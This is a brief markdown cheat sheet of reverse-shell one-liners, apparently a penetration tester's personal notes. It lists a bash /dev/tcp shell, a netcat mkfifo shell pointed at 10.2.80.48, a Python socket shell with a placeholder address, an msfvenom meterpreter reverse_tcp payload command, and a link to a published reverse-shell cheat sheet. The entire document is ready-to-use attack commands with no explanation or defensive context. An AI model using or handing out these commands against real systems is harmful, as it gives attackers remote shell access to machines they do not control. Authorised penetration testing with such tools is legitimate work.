# Reverse Shells

## Bash
`bash -i >& /dev/tcp/IP_ADDRESS/PORT 0>&1`


# Netcat

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.80.48 1234 >/tmp/f`


# Python

`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOURIPADDRESS",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.xx.xx.xx LPORT=4443 -f elf -o mt.bin


https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet